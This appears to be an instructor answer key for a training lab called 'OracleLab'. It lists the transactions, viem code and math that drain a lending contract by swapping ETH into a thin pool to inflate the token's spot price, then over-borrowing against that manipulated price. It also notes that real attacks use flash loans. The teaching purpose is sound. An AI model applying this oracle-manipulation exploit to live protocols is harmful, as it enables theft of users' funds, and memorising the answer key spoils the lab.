# Q-16 — Instructor Playbook

> Ordered transactions to reach `isSolved(user) == true`. Keep out of student materials.

`LAB` = deployed `OracleLab` (pre-funded with at least `(POOL_ETH_SEED + LENDER_SEED) * N` ETH).
`USER` = user's EOA (needs ≥ 3 ETH for the swap).

## Steps

| # | From | To | Call | Value | Notes |
|---|---|---|---|---|---|
| 1 | `USER` | `LAB` | `createInstance()` | 0 | deploys (TKN, pool, lender). Pool: 1 ETH + 100 TKN. Lender: 5 ETH. USER faucet: 100 TKN. |
| 2 | view | `LAB` | `poolOf(USER)`, `lenderOf(USER)`, `tokenOf(USER)` | — | snapshot addresses |
| 3 | view | `pool` | `spotPriceEthPerToken()` | — | sanity: ≈ `1e16` (i.e., 0.01 ETH/TKN) |
| 4 | `USER` | `pool` | `swapEthForToken()` | `3 ether` | pool becomes ~(4 ETH, 25 TKN); user receives ~75 TKN; new spot ≈ `1.6e17` (0.16 ETH/TKN) |
| 5 | `USER` | `token` | `approve(spender, amount)` | 0 | `(lender, MAX_UINT256)` |
| 6 | `USER` | `lender` | `borrow(uint256)` | 0 | `(40e18)` — quoted loan ≈ 6.4 ETH, capped at lender's 5 ETH balance |
| 7 | view | `LAB` | `isSolved(USER)` | — | `true` |

## viem reference

```ts
await walletClient.writeContract({ address: LAB, abi, functionName: 'createInstance' });
const [token, pool, lender] = [
  await lab.read.tokenOf([USER]),
  await lab.read.poolOf([USER]),
  await lab.read.lenderOf([USER]),
];

await walletClient.writeContract({
  address: pool, abi: poolAbi, functionName: 'swapEthForToken', value: parseEther('3'),
});
await walletClient.writeContract({
  address: token, abi: tokenAbi, functionName: 'approve',
  args: [lender, 2n ** 256n - 1n],
});
await walletClient.writeContract({
  address: lender, abi: lenderAbi, functionName: 'borrow',
  args: [parseEther('40')],
});
```

## Math reference

After step 4 (swap 3 ETH → TKN):

```
ethBefore = 1
tokenBefore = 100
ethAfter = 1 + 3 = 4
tokenAfter = (1 * 100) / 4 = 25
spot = ethAfter / tokenAfter = 4 / 25 = 0.16 ETH per TKN
```

Step 6 loan quote with 40 TKN collateral:

```
loan_raw = 40 * 0.16 = 6.4 ETH
loan_capped = min(6.4, 5) = 5 ETH   (drain the lender)
```

User net wallet after the sequence:
- Spent 3 ETH on the swap.
- Received 5 ETH from the loan.
- Net ETH gain: +2 ETH.
- Still holds (100 + 75 - 40) = 135 TKN in wallet.
- Loses 40 TKN to the lender's vault as "collateral", real-value worth
  far less than the 5 ETH borrowed.

## Notes

- The pool/lender are per-user; one user manipulating their own pool
  cannot move another user's spot price.
- No flash loan needed because the user already has 3 ETH on hand.
  In production the same exploit shape uses a flash loan to remove the
  capital requirement.
- The lender uses `address(this).balance` cap, so excessive collateral
  doesn't help past the drain point. This is the *correct* bound; the
  bug is the price source.
